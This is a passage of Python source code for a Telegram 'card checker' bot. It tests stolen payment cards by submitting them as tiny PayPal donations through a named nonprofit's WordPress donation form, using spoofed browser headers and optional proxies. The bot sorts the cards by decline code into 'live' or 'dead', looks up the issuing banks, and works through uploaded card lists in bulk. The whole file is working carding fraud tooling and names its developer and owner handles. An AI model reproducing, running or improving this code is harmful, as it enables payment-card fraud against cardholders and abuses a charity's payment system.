            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data, timeout=10)
        
        data = MultipartEncoder({
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, id_form1),
            'give-form-id': (None, id_form2),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://publicbankinginstitute.org/donations/donor'),
            'give-form-url': (None, 'https://publicbankinginstitute.org/donations/donor'),
            'give-form-minimum': (None, '0.01'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nonec),
            'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '0.01'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'bot'),
            'give_last': (None, 'rights and'),
            'give_email': (None, 'bot22@gmail.com'),
            'card_name': (None, 'bot'),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers = {
            'content-type': data.content_type,
            'origin': f'https://{domain}',
            'referer': 'https://publicbankinginstitute.org/donations/donor',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
        response = r.post(f'https://{domain}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data, timeout=10)
        text = response.text
        
        if 'true' in text or 'sucsess' in text or 'COMPLETED' in text:    
            return "CHARGE 🔥"
        elif 'INSUFFICIENT_FUNDS' in text:
            return 'INSUFFICIENT FUNDS ✅'
        elif 'DO_NOT_HONOR' in text:
            return "DO NOT HONOR"
        elif 'ACCOUNT_CLOSED' in text:
            return "ACCOUNT CLOSED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return "ACCOUNT CLOSED"
        elif 'LOST_OR_STOLEN' in text:
            return "LOST OR STOLEN"
        elif 'CVV2_FAILURE' in text:
            return "CVV2 FAILURE"
        elif 'SUSPECTED_FRAUD' in text:
            return "SUSPECTED FRAUD"
        elif 'INVALID_ACCOUNT' in text:
            return 'INVALID ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return "REATTEMPT NOT PERMITTED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text:
            return "ACCOUNT BLOCKED BY ISSUER"
        elif 'ORDER_NOT_APPROVED' in text:
            return 'ORDER NOT APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return 'PICKUP CARD SPECIAL CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in text:
            return "PAYER CANNOT PAY"
        elif 'GENERIC_DECLINE' in text:
            return 'GENERIC DECLINE'
        elif 'COMPLIANCE_VIOLATION' in text:
            return "COMPLIANCE VIOLATION"
        elif 'TRANSACTION NOT PERMITTED' in text:
            return "TRANSACTION NOT PERMITTED"
        elif 'PAYMENT_DENIED' in text:
            return 'PAYMENT DENIED'
        elif 'INVALID_TRANSACTION' in text:
            return "INVALID TRANSACTION"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return "RESTRICTED OR INACTIVE ACCOUNT"
        elif 'SECURITY_VIOLATION' in text:
            return 'SECURITY VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return "DECLINED DUE TO UPDATED ACCOUNT"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return "INVALID CARD"
        elif 'EXPIRED_CARD' in text:
            return "EXPIRED CARD"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return "CRYPTOGRAPHIC FAILURE"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return "TRANSACTION CANNOT BE COMPLETED"
        elif 'DECLINED_PLEASE_RETRY' in text:
            return "DECLINED PLEASE RETRY"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return "EXCEED LIMIT"
        else:
            try:
                result = response.json()['data']['error']
                return f"{result}"
            except:
                return "UNKNOWN ERROR"
                
    except Exception as e:
        return f"ERROR"

def UniversalChecker(ccx, gate_choice, user_id):
    if gate_choice == 1:
        return check_gate_050(ccx, user_id)
    elif gate_choice == 2:
        return check_gate_010(ccx, user_id)
    elif gate_choice == 3:
        return check_gate_001(ccx, user_id)
    else:
        return check_gate_050(ccx, user_id)

def reg(cc):
    try:
        regex = r'\d+'
        matches = re.findall(regex, cc)
        match = ''.join(matches)
        n = match[:16]
        mm = match[16:18]
        yy = match[18:20]
        
        if yy == '20':
            yy = match[18:22]
            if n.startswith("3"):
                cvc = match[22:26]
            else:
                cvc = match[22:25]
        else:
            if n.startswith("3"):
                cvc = match[20:24]
            else:
                cvc = match[20:23]
                
        cc = f"{n}|{mm}|{yy}|{cvc}"
        
        if not re.match(r'^\d{16}$', n):
            return None
        if not re.match(r'^\d{3,4}$', cvc):
            return None
            
        return cc
    except:
        return None

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/"+zh, timeout=5).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        
        mn = f'''[𖦹] INFO: {brand} - {card_type} - {level}
[𖦹] BANK: {bank} - {country_flag}
[𖦹] COUNTRY: {country_name} [ {country_flag} ]'''
        return mn
    except:
        return '[𖦹] INFO: No Info\n[𖦹] BANK: No Bank\n[𖦹] COUNTRY: No Country'

@bot.message_handler(commands=['v', 'V'])
def gate_v(message):
    gate_choice = 1
    gate_name = "paypal custom 0.50✅"
    
    proxy_status = ""
    user_id = str(message.from_user.id)
    if user_id in proxy_enabled and proxy_enabled[user_id]:
        proxy_status = "\n✅ Proxy enabled for this check"
    
    msg = bot.send_message(message.chat.id, f"Selected: {gate_name}{proxy_status}\nNow send the card in format: XXXXXXXXXXXXXXXX|MM|YYYY|CVV")
    bot.register_next_step_handler(msg, process_card, gate_choice, gate_name)

@bot.message_handler(commands=['pp', 'PP'])
def gate_pp(message):
    gate_choice = 2
    gate_name = "paypal custom 0.10✅"
    
    proxy_status = ""
    user_id = str(message.from_user.id)
    if user_id in proxy_enabled and proxy_enabled[user_id]:
        proxy_status = "\n✅ Proxy enabled for this check"
    
    msg = bot.send_message(message.chat.id, f"Selected: {gate_name}{proxy_status}\nNow send the card in format: XXXXXXXXXXXXXXXX|MM|YYYY|CVV")
    bot.register_next_step_handler(msg, process_card, gate_choice, gate_name)

@bot.message_handler(commands=['cc', 'CC'])
def gate_cc(message):
    gate_choice = 3
    gate_name = "paypal custom 0.01❤️‍🩹"
    
    proxy_status = ""
    user_id = str(message.from_user.id)
    if user_id in proxy_enabled and proxy_enabled[user_id]:
        proxy_status = "\n✅ Proxy enabled for this check"
    
    msg = bot.send_message(message.chat.id, f"Selected: {gate_name}{proxy_status}\nNow send the card in format: XXXXXXXXXXXXXXXX|MM|YYYY|CVV")
    bot.register_next_step_handler(msg, process_card, gate_choice, gate_name)

def process_card(message, gate_choice, gate_name):
    idt = message.from_user.id
    user_id = str(message.from_user.id)
    cc = message.text
    
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
            return
    
    ko = bot.send_message(message.chat.id, "- Wait checking your card ...").message_id
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    start_time = time.time()
    try:
        command_usage[idt]['last_time'] = datetime.now()
        last = UniversalChecker(cc, gate_choice, user_id)
    except Exception as e:
        last = 'ERROR'
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    if 'CHARGE 🔥' in last:
        status = "CHARGE 🔥"
        title = "CHARGE 🔥"
        proxy_status = "LIVE✅"
    elif 'INSUFFICIENT FUNDS ✅' in last:
        status = "APPROVED ✅"
        title = "INSUFFICIENT FUNDS ✅"
        proxy_status = "LIVE✅"
    elif 'ERROR' in last:
        status = "ERROR"
        title = "ERROR"
        proxy_status = "DEAD❌"
    else:
        status = "DECLINED"
        title = "DECLINED"
        proxy_status = "LIVE✅"
    
    bin_info = dato(cc[:6])
    
    proxy_text = ""
    if user_id in proxy_enabled and proxy_enabled[user_id]:
        proxy_text = " | PROXY: ✅"
    
    msg = f'''{title}
 {gate_name} [MASS] 🐦‍🔥
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] CARD: <code>{cc}</code>
[𖦹] STATUS: {status}
[𖦹] RESPONSE: {last}
- - - - - - - - - - - - - - - - - - - - - - -
{bin_info}
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] TIME: {execution_time:.1f} SEC.{proxy_text}
[𖦹] GATE: {gate_name}
BOT DEV: Abdallah Mansour
OWNER: @mansfrsd1
🍀'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

@bot.message_handler(content_types=('document'))
def handle_document(message):
    user_id = str(message.from_user.id)

    markup = types.InlineKeyboardMarkup(row_width=3)
    gate1 = types.InlineKeyboardButton("0.50✅", callback_data="file_gate1")
    gate2 = types.InlineKeyboardButton("0.10✅", callback_data="file_gate2")
    gate3 = types.InlineKeyboardButton("0.01❤️‍🩹", callback_data="file_gate3")
    markup.add(gate1, gate2, gate3)
    
    bot.reply_to(message, 'Select gate for file processing:', reply_markup=markup)
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error downloading file: {e}")

@bot.callback_query_handler(func=lambda call: call.data in ['file_gate1', 'file_gate2', 'file_gate3'])
def handle_file_gate(call):
    if call.data == 'file_gate1':
        gate_choice = 1
        gate_name = "paypal custom 0.50✅"
    elif call.data == 'file_gate2':
        gate_choice = 2
        gate_name = "paypal custom 0.10✅"
    else:
        gate_choice = 3
        gate_name = "paypal custom 0.01❤️‍🩹"
    
    def check_file():
        user_id = str(call.from_user.id)
        charge_count = 0
        insf_count = 0
        declined_count = 0
        filename = f"com{user_id}.txt"
        
        proxy_status = ""
        if user_id in proxy_enabled and proxy_enabled[user_id]:
            proxy_status = " with proxy ✅"
        
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"- Please Wait Processing Your File With {gate_name}{proxy_status} ..")
        
        with open(filename, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            stopuser.setdefault(user_id, {})['status'] = 'start'
            
            for cc in lino:
                if stopuser.get(user_id, {}).get('status') == 'stop':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''The Has Stopped Checker. 🤓
                        
CHARGE 🔥 : {charge_count}
INSUFFICIENT FUNDS ✅ : {insf_count}
DECLINED : {declined_count}
TOTAL! : {charge_count + insf_count + declined_count} / {total}
GATE: {gate_name}
DEV! : Abdallah Mansour
OWNER: @mansfrsd1''')
                    return
                
                cc = cc.strip()
                if not cc:
                    continue
                    
                try:
                    start_time = time.time()
                    last = UniversalChecker(cc, gate_choice, user_id)
                except Exception as e:
                    last = "ERROR"
                
                if 'CHARGE 🔥' in last:
                    charge_count += 1
                elif 'INSUFFICIENT FUNDS ✅' in last:
                    insf_count += 1
                else:
                    declined_count += 1
                
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc[:20]}... •", callback_data='u8')
                status = types.InlineKeyboardButton(f"- STATUS! : {last[:15]}... •", callback_data='u8')
                cm2 = types.InlineKeyboardButton(f"- CHARGE 🔥 : [ {charge_count} ] •", callback_data='x')
                cm3 = types.InlineKeyboardButton(f"- INSUFFICIENT FUNDS ✅ : [ {insf_count} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"- DECLINED : [ {declined_count} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"- TOTAL! : [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton("[ STOP CHECKER! ]", callback_data='stop')
                mes.add(cm1, status, cm2, cm3, cm4, cm5, stop)
                
                end_time = time.time()
                execution_time = end_time - start_time
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker Running... ☑️
- Time: {execution_time:.2f}s
- Gate: {gate_name}{proxy_status}''',
                    reply_markup=mes
                )
                
                if 'CHARGE 🔥' in last or 'INSUFFICIENT FUNDS ✅' in last:
                    if 'CHARGE 🔥' in last:
                        title = "CHARGE 🔥"
                        status_text = "CHARGE 🔥"
                    else:
                        title = "INSUFFICIENT FUNDS ✅"
                        status_text = "APPROVED ✅"
                    
                    bin_info = dato(cc[:6]) if len(cc) >= 6 else "No Info"
                    
                    msg = f'''{title}
 {gate_name} [MASS] 🐦‍🔥
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] CARD: <code>{cc}</code>
[𖦹] STATUS: {status_text}
[𖦹] RESPONSE: {last}
- - - - - - - - - - - - - - - - - - - - - - -
{bin_info}
- - - - - - - - - - - - - - - - - - - - - - -
[𖦹] TIME: {execution_time:.1f} SEC.{proxy_status}
[𖦹] GATE: {gate_name}
BOT DEV: Abdallah Mansour
OWNER: @mansfrsd1
🍀'''
                    bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                
                time.sleep(10)
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''The Inspection Was Completed. 🥳
    
CHARGE 🔥 : {charge_count}
INSUFFICIENT FUNDS ✅ : {insf_count}
DECLINED : {declined_count}
TOTAL! : {charge_count + insf_count + declined_count}
GATE: {gate_name}
DEV! : Abdallah Mansour
OWNER: @mansfrsd1''')
    
    my_thread = threading.Thread(target=check_file)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(3)